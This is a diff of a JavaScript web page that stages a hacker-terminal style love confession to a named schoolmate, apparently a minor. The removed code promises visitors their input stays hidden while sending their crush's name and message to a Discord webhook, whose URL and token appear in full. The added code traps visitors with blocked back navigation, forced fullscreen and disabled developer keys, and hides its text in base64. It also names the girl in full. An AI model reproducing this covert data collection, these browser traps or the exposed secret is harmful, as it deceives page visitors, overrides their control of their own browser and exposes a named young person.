+                osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.1); 
+                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.6);
+                osc.start(); osc.stop(audioCtx.currentTime + 0.6);
+            } catch(e) {}
+        }
+
+        function forceUnlockAudio() {
+            if (audioUnlocked) return;
+            initAudioVisualizer();
+            if (audioCtx && audioCtx.state === 'suspended') { audioCtx.resume().then(() => { audioUnlocked = true; }); }
+            if (step > 0 && bgMusic && bgMusic.paused) { bgMusic.play().catch(e=>{}); }
+        }
+        document.body.addEventListener('click', forceUnlockAudio);
+        document.body.addEventListener('touchstart', forceUnlockAudio);
+        inputField.addEventListener('focus', forceUnlockAudio);
+
+        // --- 3D PARALLAX GYRO/MOUSE SETUP ---
+        let targetTiltX = 0, targetTiltY = 0;
+        let currentTiltX = 0, currentTiltY = 0;
+
+        window.addEventListener('mousemove', e => {
+            targetTiltX = (e.clientX / window.innerWidth - 0.5) * 30; 
+            targetTiltY = (e.clientY / window.innerHeight - 0.5) * 30;
+        });
+
+        window.addEventListener('deviceorientation', e => {
+            if(e.gamma !== null && e.beta !== null) {
+                let x = Math.max(-40, Math.min(40, e.gamma)); 
+                let y = Math.max(-40, Math.min(40, e.beta - 45)); 
+                targetTiltX = x * 0.8; targetTiltY = y * 0.8;
             }
-        }, intervalTime);
-    }
+        });
 
-    function fadeInAudio(audio, duration, targetVol = 1) {
-        if (!audio) return;
-        audio.volume = 0;
-        audio.play().catch(e=>{});
-        let stepAmt = 0.05;
-        let intervalTime = duration / (targetVol / stepAmt);
-        let fadeInterval = setInterval(() => {
-            if (audio.volume < targetVol - stepAmt) {
-                audio.volume += stepAmt;
-            } else {
-                audio.volume = targetVol;
-                clearInterval(fadeInterval);
-            }
-        }, intervalTime);
-    }
+        // HIDING NAMES AND MESSAGES VIA BASE64 DECODING (atob)
+        const _hiddenNames = ["a2F0aA==", "Y2F0aA==", "Y2F0aHlseW4gbmFjYXJpbw==", "Y2F0aHlseW4gbHVjYXMgbmFjYXJpbw==", "Y2F0aHlseW4gbC4gbmFjYXJpbw=="];
+        const validNames = _hiddenNames.map(name => atob(name).toLowerCase());
 
-    // --- 1: THE TERMINAL PRANK SEQUENCE ("JOKE LANG") ---
-    const encodedLines = [
-      "PHNwYW4gY2xhc3M9J2dsb3ctc3lzJz5bU3lzdGVtXTwvc3Bhbj4gU2Nhbm5pbmcgaW50ZXJuYWwgbWVtb3J5IGJhbmtzLi4u", 
-      "PHNwYW4gY2xhc3M9J2dsb3ctd2Fybic+W1dBUk5JTkddPC9zcGFuPiBVbmF1dGhvcml6ZWQgZmVlbGluZ3MgZGV0ZWN0ZWQgaW4gc2VjdG9yIDQu", 
-      "PHNwYW4gY2xhc3M9J2dsb3ctc3lzJz5bU3lzdGVtXTwvc3Bhbj4gTWVzc2FnZSBzYSBpbW8gbmkge1ZBTH0=", 
-      "QWN0dWFsbHksIG1hdGFnYWwga28gbmEgZ3VzdG9uZyBhbWluaW4gJ3RvIHNhJ3lvLiBJIGp1c3QgZGlkbid0IGtub3cgaG93Lg==", 
-      "RXZlcnkgdGltZSB3ZSB0YWxrLCBJIHNtaWxlLiBJYmFuZy1pYmEga2Ega2FzaSBzYSBsYWhhdC4gWW91IG1ha2UgbWUgcmVhbGx5IGhhcHB5Lg==", 
-      "U28sIGJlZm9yZSBJIGxvc2UgbXkgbmVydmUuLi4gSSB3YW50IHlvdSB0byBrbm93Lg==", 
-      "R3VzdG8ga2l0YS4gSSByZWFsbHksIHJlYWxseSBsaWtlIHlvdS4gPHNwYW4gY2xhc3M9J2hlYXJ0LWdsb3cnPiZoZWFydHM7PC9zcGFuPg==", 
-      "PHNwYW4gY2xhc3M9J2dsaXRjaC10ZXh0Jz4vLyBDUklUSUNBTCBFUlJPUjogSm9rZSBsYW5nIEhBSEhBSEhBSCEhISBVVE8tVVRPISAvLzwvc3Bhbj4=" 
-    ];
+        // Hiding the verification prompts to prevent code snooping
+        const prompt1 = atob("PHNwYW4gY2xhc3M9J2dsb3ctc3lzJz5bU3lzdGVtXTwvc3Bhbj4gSWRlbnRpdHkgdmVyaWZpZWQuIEhpIDxzcGFuIGNsYXNzPSdnbG93LW5hbWUnPkthdGg8L3NwYW4+LCB0aGVyZSBpcyBzb21ldGhpbmcgSSB3YW50IHRvIHNoYXJlIHdpdGggeW91LiBQcm9jZWVkPyAoeWVzL25vKTog");
+        const prompt2 = atob("PHNwYW4gY2xhc3M9J2dsb3ctc3lzJz5bU3lzdGVtXTwvc3Bhbj4gQXJlIHlvdSBhYnNvbHV0ZWx5IHN1cmUgd2FudCB0byBwcm9jZWVkLCA8c3BhbiBjbGFzcz0nZ2xvdy1uYW1lJz5LYXRoPC9zcGFuPj8gKHllcy9ubyk6IA==");
+        const prompt3 = atob("PHNwYW4gY2xhc3M9J2dsb3ctamVjJz5bSmVjXTwvc3Bhbj4gQmFnbyBtbyBtYWJhc2EsIHByb21pc2UgbW8gbXVuYSBuYSBub3JtYWwgbGFuZyB0YXlvIHBhZ2thdGFwb3Mgbml0byBoYT8gUGF5YWcga2EgYmE/ICh5ZXMvbm8pOiA=");
 
-    // --- 2: AUDIO LYRICS SEQUENCE ---
-    const musicMessages = [
-        { text: atob("T2theSBsYW5nIDxzcGFuIGNsYXNzPSdyZWQtdGV4dCc+bWFpd2FuPC9zcGFuPi4="), time: 0.5 }, 
-        { text: atob("T2theSBsYW5nIDxzcGFuIGNsYXNzPSdyZWQtdGV4dCc+bWFzYWt0YW48L3NwYW4+Lg=="), time: 3.0 }, 
-        { text: atob("T2theSBsYW5nIDxzcGFuIGNsYXNzPSdyZWQtdGV4dCc+bWFiaWdvPC9zcGFuPi4uLiBkYWhpbCBpa2F3IGF5IG5hZ21hbWFoYWwu"), time: 6.0 }, 
-        { text: atob("PHNwYW4gY2xhc3M9J3JlZC10ZXh0Jz5BbWVuPC9zcGFuPi4="), time: 10.5 }, 
-        { text: atob("S3VuZyBheWF3IG1vbmcgbWFzYWt0YW4sICd3YWcga2FuZyA8c3BhbiBjbGFzcz0ncmVkLXRleHQnPm1hZ21hbWFoYWw8L3NwYW4+Lg=="), time: 13.0 }, 
-        { text: atob("SWYgeW91IGRvbid0IHdhbnQgdG8gYmUgPHNwYW4gY2xhc3M9J3JlZC10ZXh0Jz5icm9rZW48L3NwYW4+LCBkb24ndCBsb3ZlIGF0IGFsbC4="), time: 17.5 } 
-    ];
+        // EXTREME PRIVACY LOGIC & ANTI-EXIT TRAPS
+        const applyBlur = () => document.body.classList.add('system-blur');
+        const removeBlur = () => document.body.classList.remove('system-blur');
+        
+        window.addEventListener('blur', applyBlur);
+        window.addEventListener('focus', removeBlur);
+        document.addEventListener('visibilitychange', () => { if(document.hidden) applyBlur(); else removeBlur(); });
+        window.addEventListener('pagehide', applyBlur);
+        document.addEventListener('mouseleave', applyBlur);
+        document.addEventListener('mouseenter', removeBlur);
 
-    // DISCORD WEBHOOK
-    function sendToDiscord(messageText) {
-        const webhookUrl = "https://discord.com/api/webhooks/1488849908214665248/LzlwmMwfq_YBzm2VZ1unux9zP7dKBc-_On5mw2YpV-QiddOyShkwEsl42H1k4b2ua2Ia";
-        const payload = {
-            embeds: [{
-                title: "💌 SYSTEM ALERT: New Message Received",
-                color: 0x00e5ff,
-                fields: [
-                    { name: "Target Crush Name", value: `**${targetCrush}**`, inline: false },
-                    { name: "25+ Word Message", value: `"${messageText}"`, inline: false }
-                ],
-                footer: { text: "Secure Encrypted Channel Log" },
-                timestamp: new Date().toISOString()
-            }]
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        window.addEventListener('beforeunload', (e) => { 
+            if (document.body.classList.contains('theme-unlocked')) { 
+                e.preventDefault(); e.returnValue = 'Please finish reading the message before leaving.'; 
+            } 
+        });
+
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = function () {
+            window.history.pushState(null, "", window.location.href);
+            if (document.body.classList.contains('theme-unlocked')) activateFullscreen(); 
         };
 
-        fetch(webhookUrl, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).catch(e=>{});
-    }
-
-    // BOOT UP
-    setTimeout(() => {
-        typeWriter("Initializing Secure Gateway...\n<br>", () => {
-            setTimeout(() => {
-                typeWriter("<span class='glow-sys'>[OK]</span> Connection established.<br><br><span class='glow-sys'>[System]</span> Please add your crush here. (this not send to the website dev your crush is hide for us. ): ", showInput);
-            }, 600);
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement && document.body.classList.contains('theme-unlocked')) {
+                activateFullscreen();
+            }
         });
-    }, 800);
 
-    inputField.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') {
-        const val = inputField.value.trim(); if(!val) return;
-        hideInput(); 
-        historyDiv.innerHTML += `<br><span class="input-arrow">~ $</span><span style="color:#fff; text-shadow: 0 0 12px rgba(255,255,255,0.9); font-size:110%;">${val}</span><br><br>`;
-        inputField.value = ""; process(val);
-      }
-    });
+        inputField.addEventListener('focus', () => {
+            setTimeout(() => { termBody.scrollTop = termBody.scrollHeight; inputContainer.scrollIntoView({ behavior: "smooth", block: "center" }); }, 300);
+        });
+        window.addEventListener('resize', () => {
+            if(document.activeElement === inputField) { termBody.scrollTop = termBody.scrollHeight; inputContainer.scrollIntoView({ behavior: "smooth", block: "center" }); }
+        });
 
-    function process(val) {
-      if (step === 0) {
-          
-          // FADE IN BACKGROUND MUSIC
-          if (bgMusic) fadeInAudio(bgMusic, 2000, 0.6); 
-          
-          if (prankAudio) {
-              prankAudio.muted = true;
-              prankAudio.play().then(() => {
-                  prankAudio.pause();
-                  prankAudio.currentTime = 0;
-                  prankAudio.muted = false; 
-              }).catch(e => {});
+        document.body.addEventListener('click', (e) => { 
+            if(e.target.tagName !== "INPUT" && inputContainer.style.display === "flex") inputField.focus(); 
+            if(e.target.tagName !== "INPUT" && document.body.classList.contains('theme-unlocked')) activateFullscreen(); 
+        });
+
+        function safeGetLock() { try { return window.localStorage ? window.localStorage.getItem("terminalLockdownTime") : null; } catch(e) { return null; } }
+        function safeSetLock(val) { try { if (window.localStorage) window.localStorage.setItem("terminalLockdownTime", val); } catch(e) {} }
+        function safeClearLock() { try { if (window.localStorage) window.localStorage.removeItem("terminalLockdownTime"); } catch(e) {} }
+
+        document.addEventListener('keydown', (e) => {
+          if (e.ctrlKey && e.shiftKey && e.key === 'K') { safeClearLock(); location.reload(); return; }
+          if (['f12', 'u', 'i', 'j', 'c', 'escape'].includes(e.key.toLowerCase()) && (e.ctrlKey || e.metaKey || e.key.toLowerCase() === 'escape')) { e.preventDefault(); activateFullscreen(); }
+          if (lockdownKeys) {
+            const allowed = ['y', 'n', 'e', 's', 'o', 'enter', 'backspace'];
+            if (!allowed.includes(e.key.toLowerCase())) e.preventDefault();
           }
+        });
 
-          targetCrush = val; 
-          step++; 
-          let prompt = `Identity Confirmed.<br><span class='glow-sys'>[System]</span> Proceed with decryption for user: <span class='glow-sys' style='font-size:110%;'>${val}</span>? (yes/no): `;
-          typeWriter(prompt, showInput);
-
-      } else if (step === 1) {
-          if (val.toLowerCase() === 'y' || val.toLowerCase() === 'yes') {
-            step++; 
-            historyDiv.innerHTML = ""; 
-            startConfessionSequence();
-          } else {
-            typeWriter("<span class='glow-sys'>[System]</span> Decryption aborted. Connection closed.", null);
-          }
-
-      } else if (step === 3) {
-          let wordCount = val.split(/\s+/).filter(word => word.length > 0).length;
-          
-          if (wordCount < 25) {
-              let errorMsg = `<span class='glow-warn'>[WARNING]</span> Error: Effort too low! You only typed ${wordCount} words out of 25.<br><br><span class='glow-sys'>[System]</span> Subukan mo ulit. Ano sabihan mo ha: `;
-              typeWriter(errorMsg, showInput);
-          } else {
-              step++;
-              sendToDiscord(val);
-              typeWriter("<span class='glow-sys'>[System]</span> Message saved securely and transmitted. Thank you for your cooperation.", null);
-          }
-      }
-    }
-
-    // TERMINAL PRANK SEQUENCE
-    function startConfessionSequence() {
-      const finalLines = encodedLines.map(line => atob(line).replace('{VAL}', `<span class='glow-sys' style='font-size:110%;'>${targetCrush}</span>`));
-      let i = 0;
-      
-      function next() {
-        if (i < finalLines.length) {
-          let message = finalLines[i]; 
-          let delayNext = (i === 6) ? 3500 : 2200; 
-          
-          let spacing = (i === 0 || i === 1) ? "<br>" : "<br><br>";
-          
-          typeWriter(message + spacing, () => {
-            if (i === 6) {
-               typingSpeed = 5; 
-            }
-            if (i === 7) {
-                document.body.classList.add('prank-active');
-                try { confetti({ particleCount: 500, spread: 200, origin: { y: 0.6 }, colors: ['#ff003c', '#000000', '#ff66b2', '#00e5ff', '#ffffff'] }); } catch(e) {}
-                
-                // FADE OUT BG MUSIC RIGHT BEFORE PRANK AUDIO HITS
-                fadeOutAudio(bgMusic, 1500);
-
-                setTimeout(() => {
-                    startAudioSequence();
-                }, 4000);
-            }
-            i++; 
-            if (i <= 7) setTimeout(next, delayNext); 
-          });
+        function activateFullscreen() { 
+            if (document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement) return;
+            const el = document.documentElement; 
+            try { if (el.requestFullscreen) el.requestFullscreen().catch(err=>{}); else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen(); } catch (error) {}
+            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') { DeviceOrientationEvent.requestPermission().catch(e=>{}); }
         }
-      }
-      next();
-    }
 
-    // SYNCED AUDIO SEQUENCE
-    function startAudioSequence() {
-      document.body.classList.remove('prank-active');
-      historyDiv.innerHTML = "";
-      typingSpeed = 35; 
-      
-      terminalUI.classList.add('music-mode');
-      
-      if (prankAudio) {
-          prankAudio.currentTime = 0;
-          fadeInAudio(prankAudio, 500, 1); 
-      }
+        setTimeout(() => {
+            let lock = safeGetLock();
+            if (lock && Date.now() < parseInt(lock)) enforceLockdown(parseInt(lock));
+            else typeWriter("<span class='glow-sys'>[System]</span> Please enter your authorized name or nickname: ", showInput);
+        }, 800);
 
-      let currentLyricIndex = 0;
-
-      function syncLyrics() {
-          if (currentLyricIndex < musicMessages.length) {
-              if (prankAudio.currentTime >= musicMessages[currentLyricIndex].time) {
-                  isTyping = false; 
-                  clearTimeout(typeTimeout);
-                  historyDiv.innerHTML = ""; 
-                  typingTextSpan.innerHTML = "";
-                  
-                  let msg = musicMessages[currentLyricIndex].text;
-                  currentLyricIndex++;
-                  
-                  // NEW: Lyric-pop animation + color enhancement
-                  historyDiv.innerHTML += `<div class="lyric-pop">${msg}</div><br>`;
-              }
+        inputField.addEventListener('keypress', (e) => {
+          if (e.key === 'Enter') {
+            const val = inputField.value.trim(); if(!val) return;
+            hideInput(); 
+            historyDiv.innerHTML += `<br><span style="color:var(--accent-green); font-weight: bold; margin-right: 12px;">~ $</span><span style="color:#fff;">${val}</span><br><br>`;
+            inputField.value = ""; process(val);
           }
-      }
+        });
 
-      prankAudio.addEventListener('timeupdate', syncLyrics);
+        function process(val) {
+          const low = val.toLowerCase();
+          if (step === 0) {
+            if (validNames.includes(low)) {
+              step++; document.body.classList.add('theme-unlocked'); activateFullscreen();
+              
+              // OPTION 3: Haptic vibration on verified identity
+              if (navigator.vibrate) navigator.vibrate(50);
+              
+              // OPTION 7: Play Access Granted Chime
+              playAccessGrantedSound();
 
-      prankAudio.addEventListener('ended', () => {
-          prankAudio.removeEventListener('timeupdate', syncLyrics);
-          setTimeout(() => {
-              historyDiv.innerHTML = "";
-              terminalUI.classList.remove('music-mode'); 
-              step = 3; 
-
-              // FADE BACKGROUND MUSIC BACK IN FOR THE FINAL PROMPT
-              if (bgMusic) {
-                  fadeInAudio(bgMusic, 2000, 0.6);
+              if (favicon) favicon.href = "data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💖</text></svg>";
+              if (bgMusic) { 
+                  forceUnlockAudio();
+                  let playPromise = bgMusic.play(); 
+                  if (playPromise !== undefined) { playPromise.then(() => { if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume(); }).catch(e=>{}); }
               }
+              lockdownKeys = true; 
+              setTimeout(() => typeWriter(prompt1, showInput), 800);
+            } else triggerLockdown();
+          } else if (step === 1) {
+            if (low === 'yes' || low === 'y') {
+              step++; typeWriter(prompt2, showInput);
+            } else location.reload();
+          } else if (step === 2) {
+            if (low === 'yes' || low === 'y') {
+              step++; typeWriter(prompt3, showInput);
+            } else location.reload();
+          } else if (step === 3) {
+            if (low === 'yes' || low === 'y') {
+              step++; sendToDiscord("Kath accepted agreement."); historyDiv.innerHTML = ""; 
+              
+              // Base64 Encoded Intro Message to hide it
+              let introEncoded = "PHNwYW4gY2xhc3M9J2dsb3ctc3lzJz5bU3lzdGVtXTwvc3Bhbj4gUmVtaW5kZXIgb24gb3V0c2lkZSB0aGF0IGJlIGEgRW5nbGlzaCB3b3JkKCBvbiBpbnNpZGUgdGhlIGJlIGEgVGFnYWxvZyB3b3JkKTxicj4gLSBFeC4gQSBoZWxsbyB0aGlzIGlzIHRoZSBleGFtcGxlLiAoSGVsbG8gaXRvIGFuZyBoYWxpbWJhd2EuKTxicj48YnI+PHNwYW4gY2xhc3M9J2dsb3ctc3lzJz5bU3lzdGVtXTwvc3Bhbj4gTWVzc2FnZSBpdG8gbmkgPHNwYW4gY2xhc3M9J2dsb3ctamVjJz5KZWM8L3NwYW4+LCA8c3BhbiBjbGFzcz0nZ2xvdy1uYW1lJz5LYXRoPC9zcGFuPjxicj48YnI+";
+              
+              typeWriter(atob(introEncoded), () => { typingSpeed = 85; setTimeout(playFinal, 1500); });
+            } else location.reload();
+          }
+        }
 
-              typeWriter("<span class='glow-sys'>[System]</span> Audio Stream Completed.<br><br><span class='glow-sys'>[System]</span> Ano sabihan mo ha: ", showInput);
-          }, 1000);
-      }, { once: true });
-    }
+        async function sendToDiscord(msg) {
+          const payload = { embeds: [{ title: "🛰️ SYSTEM ACCESS ALERT", description: `**Event:** ${msg}`, color: 0xff66b2, timestamp: new Date().toISOString(), footer: { text: "SECURE_HOST_7.1 | JEC-OPERATOR" } }] };
+          try { await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); } catch (e) {}
+        }
 
-    // OVERHAULED TYPING ENGINE
-    function typeWriter(text, cb) {
-      isTyping = false; 
-      clearTimeout(typeTimeout);
-      
-      setTimeout(() => {
-          isTyping = true;
-          let charIdx = 0; let currentHTML = "";
+        function playFinal() {
+          // Encoded messages so they cannot be read in the source code
+          const encodedLines = [
+            "QWN0dWFsbHksIEkndmUgYmVlbiB3YW50aW5nIHRvIHRlbGwgeW91IHRoaXMgZm9yIGEgbG9uZyB0aW1lLi4uIChTYSB0b3RvbyBsYW5nLCBtYXRhZ2FsIGtvIG5hbmcgZ3VzdG9uZyBzYWJpaGluIGl0byBzYSBpeW8uLi4p",
+            "SSBrbm93IHlvdSdsbCBiZSBpbiBHcmFkZSAxMSBhdCB5b3VyIG5leHQgc2Nob29sLCBJJ20gb25seSBpbiBHcmFkZSAxMC4gKEFsYW0ga29uZyBHcmFkZSAxMSBrYSBuYSBzYSBuZXh0IHNjaG9vbCBtbywgR3JhZGUgMTAgcGEgbGFuZyBha28uKQ==",
+            "V2l0aCBldmVyeSBjaGF0IGFuZCAnaGVsbG8nIHdlIHNheSwgSSBnZXQgdG8ga25vdyB5b3UgYmV0dGVyLiAoU2EgYmF3YXQgY2hhdCBhdCAnaGVsbG8nIG5hIHNpbmFzYWJpIG5hdGluLCBtYXMgbmFraWtpbGFsYSBraXRhLik=",
+            "SSBjYWxsIHlvdSwgSSBhbHdheXMgc2F5IGJveSBmaXJzdCBzb3JyeSBhYm91dCB0aGF0LiAoSSBjYWxsIHlvdSwgbGFnaSBrb25nIHNpbmFzYWJpIGJveSBmaXJzdCBzb3JyeSBhYm91dCB0aGF0Lik=",
+            "SSBsb3ZlIHlvdSBNTCwgSSB3YW50IHRvIHBsYXkgeW91IGEgbG90IHNvIEkgY2FuIGdldCB0byBrbm93IHlvdS4gKEkgbG92ZSB5b3UgTUwsIEkgd2FudCB0byBwbGF5IHlvdSBhIGxvdCBwYXJhIG1ha2lsYWxhIGtpdGEuKQ==",
+            "V2UgYXJlIHRoZSBzYW1lIHlvdSBsaWtlIGFuaW1lIHRvIGFuZCBtYW5nYS4gKFBhcmVobyB0YXlvIG5nIGd1c3RvIG1vIG5nIGFuaW1lIGF0IG1hbmdhLik=",
+            "WW91J3JlIG5vdCBqdXN0IGEgcGVyc29uIEkgdGFsayB0bywgeW91J3JlIHNvbWVvbmUgd2hvIGdlbnVpbmVseSBtYWtlcyBteSBkYXkuIChIaW5kaSBsYW5nIGlrYXcgYW5nIHRhb25nIGthdXNhcCBrbywgaXNhIGthbmcgdHVuYXkgbmEgYnVtdWJ1byBuZyBhcmF3IGtvLik=",
+            "SSB2YWx1ZSBldmVyeSBzZWNvbmQgb2Ygb3VyIGNvbnZlcnNhdGlvbiwgZXNwZWNpYWxseSBvdXIgbGF1Z2h0ZXIuIChQaW5haGFoYWxhZ2FoYW4ga28gYW5nIGJhd2F0IHNlZ3VuZG8gbmcgYW1pbmcgcGFnLXV1c2FwLCBsYWxvIG5hIGFuZyBhbWluZyBtZ2EgdGF3YW5hbi4p",
+            "SSB3YW50IHRvIHNheSBtb3JlLCBJIGNhbiBub3Qgbm93IEkgd25hdCB0byBrbm93IG1vcmUsIFRoYXQgYWxsIG1hc3NhZ2Ugb25seSBsYXN0IHRocmVlIG1vbnRocyAoR3VzdG8ga29uZyBzYWJpaGluIGFuZyBoaWdpdCBwYSwgaGluZGkga28gbmEgbmdheW9uIHduYXQgbWFsYW1hbiBwYSwgTmEgYW5nIGxhaGF0IG5nIG1hc2FoZSBheSB0YXRhZ2FsIGxhbWFuZyBuZyB0YXRsb25nIGJ1d2FuKQ==",
+            "PHNwYW4gc3R5bGU9J2NvbG9yOnZhcigtLWFjY2VudC1waW5rKTsgbGV0dGVyLXNwYWNpbmc6NXB4Oyc+LSAtIC0gLSAtIC0gLSAtPC9zcGFuPg==",
+            "PHNwYW4gY2xhc3M9J21hbmdhLXN0eWxlLXRleHQnPkkgcmVhbGx5IGxpa2UgeW91LCBHb29kIGx1Y2sgc2EgR3JhZGUgMTEgam91cm5leSBtbyEgPHNwYW4gY2xhc3M9J2hlYXJ0LWdsb3cnPiZoZWFydHM7PC9zcGFuPjwvc3Bhbj4="
+          ];
+
+          // Decode back to normal strings behind the scenes using atob
+          const finalLines = encodedLines.map(line => atob(line));
           
+          let i = 0;
+          function next() {
+            if (i < finalLines.length) {
+              let message = finalLines[i]; 
+              typeWriter(message + "<br><br>", () => {
+                if(i === finalLines.length - 1) { 
+                    try { 
+                        if (typeof confetti === 'function') confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } }); 
+                        // OPTION 3: Long double-vibration at the climax
+                        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                    } catch(e) {} 
+                }
+                i++; setTimeout(next, 3800); 
+              });
+            } else {
+                setTimeout(() => {
+                    const wrapper = document.getElementById('terminal-ui');
+                    wrapper.classList.add('terminal-close-anim');
+                    setTimeout(() => {
+                        document.querySelector('.nebula').style.display = 'none';
+                        document.querySelector('.cyber-grid').style.display = 'none';
+                        const c1 = document.getElementById('star-canvas'); if(c1) c1.style.display = 'none';
+                        const c2 = document.getElementById('net-canvas'); if(c2) c2.style.display = 'none';
+                        const m1 = document.getElementById('matrix-canvas'); if(m1) m1.style.display = 'none';
+                        document.getElementById('anime-silhouette').style.display = 'none';
+                        wrapper.style.display = 'none';
+                        
+                        // 5-SECOND LOCKDOWN ON OPERATOR SCREEN
+                        document.getElementById('operator-screen').style.display = 'flex';
+                        document.body.style.background = '#000000';
+                        
+                        let timeLeft = 5; // Exactly 5 seconds
+                        let opTimerDisplay = document.getElementById('operator-timer-display');
+                        
+                        let opInterval = setInterval(() => {
+                            timeLeft--;
+                            let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+                            let s = (timeLeft % 60).toString().padStart(2, '0');
+                            opTimerDisplay.innerText = `${m}:${s}`;
+                            
+                            if (timeLeft <= 0) {
+                                clearInterval(opInterval);
+                                // OPTION 10: SELF-DESTRUCT SEQUENCE
+                                opTimerDisplay.innerText = "SELF-DESTRUCTING...";
+                                opTimerDisplay.style.color = "#ff0000";
+                                opTimerDisplay.style.textShadow = "0 0 30px #ff0000";
+                                document.getElementById('operator-screen').style.background = "#ff0000";
+                                
+                                setTimeout(() => {
+                                    document.body.innerHTML = ""; // Wipe the entire page clean
+                                    document.body.style.backgroundColor = "black";
+                                    window.onbeforeunload = null; // Release the exit lock
+                                    window.close(); // Try to force close the browser tab
+                                }, 800);
+                            }
+                        }, 1000);
+                        
+                    }, 1200);
+                }, 6000); 
+            }
+          }
+          next();
+        }
+
+        function typeWriter(text, cb) {
+          if (isTyping) return; // Double protection against parallel typing
+          isTyping = true;
+          
+          let charIdx = 0; let currentHTML = "";
           function type() {
-            if (!isTyping) return; 
             if (charIdx < text.length) {
               if (text.slice(charIdx).startsWith("<")) {
                 let endIdx = text.indexOf(">", charIdx) + 1;
                 if (endIdx > charIdx) {
                     currentHTML += text.slice(charIdx, endIdx); charIdx = endIdx;
-                    typingTextSpan.innerHTML = currentHTML; 
-                    setTimeout(() => { termBody.scrollTop = termBody.scrollHeight; type(); }, 0); 
-                    return;
+                    typingTextSpan.innerHTML = currentHTML; setTimeout(type, 0); return;
+                }
+              }
+              if (text.slice(charIdx).startsWith("&")) {
+                let endIdx = text.indexOf(";", charIdx) + 1;
+                if (endIdx > charIdx) {
+                    currentHTML += text.slice(charIdx, endIdx); charIdx = endIdx;
+                    typingTextSpan.innerHTML = currentHTML; setTimeout(type, 0); return;
                 }
               }
               currentHTML += text.charAt(charIdx); charIdx++;
               typingTextSpan.innerHTML = currentHTML; 
               termBody.scrollTop = termBody.scrollHeight;
               
-              let delay = typingSpeed + (Math.random() * 25);
-              if (charIdx > 0 && (text.charAt(charIdx - 1) === '.' || text.charAt(charIdx - 1) === ',')) delay += 100; 
-              typeTimeout = setTimeout(type, delay);
+              let delay = typingSpeed + (Math.random() * 20);
+              if (charIdx > 0 && (text.charAt(charIdx - 1) === '.' || text.charAt(charIdx - 1) === ',')) delay += 150; 
+              setTimeout(type, delay);
             } else {
               historyDiv.innerHTML += typingTextSpan.innerHTML; typingTextSpan.innerHTML = "";
-              isTyping = false; 
+              isTyping = false; // Release lock
               if (cb) cb();
             }
           }
           type();
-      }, 10); 
+        }
+
+        // --- MATRIX RAIN LOGIC (FIXED EDGE CUTOFF) ---
+        const matrixCanvas = document.getElementById('matrix-canvas');
+        const mCtx = matrixCanvas ? matrixCanvas.getContext('2d') : null;
+        let matrixDrops = [];
+        const matrixFontSize = 14;
+
+        function initMatrix() {
+            if (!matrixCanvas) return;
+            matrixCanvas.width = window.innerWidth * 1.5;
+            matrixCanvas.height = window.innerHeight * 1.5;
+            const columns = Math.floor(matrixCanvas.width / matrixFontSize) + 1;
+            matrixDrops = [];
+            for(let x = 0; x < columns; x++) matrixDrops[x] = Math.random() * -100; 
+        }
+        
+        let matrixLastDraw = 0;
+        function drawMatrix(timestamp) {
+            if (!mCtx) return;
+            requestAnimationFrame(drawMatrix);
+            if (timestamp - matrixLastDraw < 50) return; 
+            matrixLastDraw = timestamp;
+
+            mCtx.fillStyle = "rgba(0, 0, 0, 0.15)";
+            mCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+
+            const unlocked = document.body.classList.contains('theme-unlocked');
+            mCtx.fillStyle = unlocked ? "#ff66b2" : "#00e5ff";
+            mCtx.font = matrixFontSize + "px 'JetBrains Mono', monospace";
+
+            for(let i = 0; i < matrixDrops.length; i++) {
+                const text = Math.random() > 0.5 ? "1" : "0";
+                mCtx.fillText(text, i * matrixFontSize, matrixDrops[i] * matrixFontSize);
+                if(matrixDrops[i] * matrixFontSize > matrixCanvas.height && Math.random() > 0.95) matrixDrops[i] = 0;
+                matrixDrops[i]++;
+            }
+        }
+
+        const starCanvas = document.getElementById('star-canvas'); const sCtx = starCanvas ? starCanvas.getContext('2d') : null;
+        const netCanvas = document.getElementById('net-canvas'); const nCtx = netCanvas ? netCanvas.getContext('2d') : null;
+        const termContainer = document.getElementById('terminal-ui');
+        let stars = []; let netNodes = []; let dust = []; let ripples = [];
+        
+        let mouse = { x: -1000, y: -1000 };
+        window.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });
+        window.addEventListener('touchmove', e => { mouse.x = e.touches[0].clientX; mouse.y = e.touches[0].clientY; });
+        window.addEventListener('touchend', () => { mouse.x = -1000; mouse.y = -1000; });
+        window.addEventListener('mouseout', () => { mouse.x = -1000; mouse.y = -1000; });
+
+        window.addEventListener('click', e => {
+            if(e.target.tagName !== "INPUT") ripples.push({ x: e.clientX, y: e.clientY, r: 0, alpha: 1 });
+        });
+
+        function initC() {
+          if (!starCanvas || !netCanvas) return;
+          
+          starCanvas.width = netCanvas.width = window.innerWidth * 1.5; 
+          starCanvas.height = netCanvas.height = window.innerHeight * 1.5;
+          
+          stars = []; netNodes = []; dust = []; const isMobile = window.innerWidth < 600;
+          
+          const numStars = isMobile ? 60 : 130; 
+          for(let i=0; i<numStars; i++) stars.push({ x: Math.random()*starCanvas.width, y: Math.random()*starCanvas.height, r: Math.random()*1.2 + 0.2, z: Math.random(), t: Math.random()*Math.PI, ts: Math.random() * 0.03 + 0.01 });
+          
+          const numNodes = isMobile ? 30 : 70;
